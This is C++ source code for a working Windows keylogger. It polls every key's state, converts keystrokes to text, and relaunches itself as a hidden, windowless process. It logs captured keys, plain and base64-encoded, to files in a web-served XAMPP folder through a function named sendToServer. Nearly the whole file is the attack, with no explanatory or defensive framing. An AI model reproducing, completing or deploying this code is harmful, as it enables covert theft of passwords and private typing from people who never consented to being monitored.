#include <iostream>
#include <fstream>
#include <string>
#include <thread>
#include <atomic>
#include <curl/curl.h>
#include <Windows.h>
#include <sstream>

std::string base64_encode(const std::string& in) {
    static const char* base64_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    std::string out;
    int val = 0, valb = -6;
    for (unsigned char c : in) {
        val = (val << 8) + c;
        valb += 8;
        while (valb >= 0) {
            out.push_back(base64_chars[(val >> valb) & 0x3F]);
            valb -= 6;
        }
    }
    if (valb > -6) out.push_back(base64_chars[((val << 8) >> (valb + 8)) & 0x3F]);
    while (out.size() % 4) out.push_back('=');
    return out;
}

void sendToServer(const std::string& data) {
    std::string encodedData = base64_encode(data);
    std::ofstream fout("C:/xampp/htdocs/captured_keys.txt", std::ios::app);
    if (fout.is_open()) {
        fout << encodedData;
        fout.close();
    }
    else {
        std::cerr << "No se pudo escribir en el archivo.\n";
    }
}

void Save(int keyCode) {
    std::ofstream fout("C:/xampp/htdocs/captured_keys.html", std::ios::app);
    if (!fout.is_open()) return;

    BYTE keyboardState[256] = { 0 };
    if (!GetKeyboardState(keyboardState)) return;

    bool isCapsLockOn = (keyboardState[VK_CAPITAL] & 0x01) != 0;
    bool isShiftPressed = (keyboardState[VK_SHIFT] & 0x80) != 0;

    UINT scanCode = MapVirtualKey(keyCode, MAPVK_VK_TO_VSC);
    WCHAR unicodeChar[5] = { 0 };
    int result = ToUnicode(keyCode, scanCode, keyboardState, unicodeChar, 4, 0);

    std::string capturedChar;

    if (result > 0) {
        char mbChar[5] = { 0 };
        WideCharToMultiByte(CP_UTF8, 0, unicodeChar, 1, mbChar, 4, NULL, NULL);
        capturedChar = mbChar;
        fout << capturedChar;
    }
    else {
        switch (keyCode) {
        case VK_SPACE: capturedChar = " "; fout << ' '; break;
        case VK_RETURN: capturedChar = "\n"; fout << '\n'; break;
        case VK_TAB: capturedChar = "[TAB]"; fout << "[TAB]"; break;
        case VK_BACK: capturedChar = "[BACKSPACE]"; fout << "[BACKSPACE]"; break;
        case VK_SHIFT: case VK_LSHIFT: case VK_RSHIFT:
            capturedChar = "[SHIFT]"; fout << "[SHIFT]"; break;
        }
    }

    fout.close();

  
    if (!capturedChar.empty()) {
        sendToServer(capturedChar);
    }
}

void keylogger() {
    while (true) {
        for (int i = 8; i < 190; i++) {
            if (GetAsyncKeyState(i) == -32767) {
                Save(i); 
            }
        }
        Sleep(10);
    }
}

bool isRelaunched = false;

int main(int argc, char* argv[]) {
    for (int i = 0; i < argc; i++) {
        if (std::string(argv[i]) == "--hidden") {
            isRelaunched = true;
            break;
        }
    }

    if (!isRelaunched) {
        char path[MAX_PATH];
        GetModuleFileNameA(NULL, path, MAX_PATH);

        STARTUPINFOA si = { sizeof(si) };
        PROCESS_INFORMATION pi;
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;

        std::string command = std::string("\"") + path + "\" --hidden";

        if (CreateProcessA(NULL, &command[0], NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            exit(0); 
        }
    }

    std::thread keyloggerThread(keylogger);

    while (true) {
        Sleep(10000);
    }

    keyloggerThread.join();
    return 0;
}
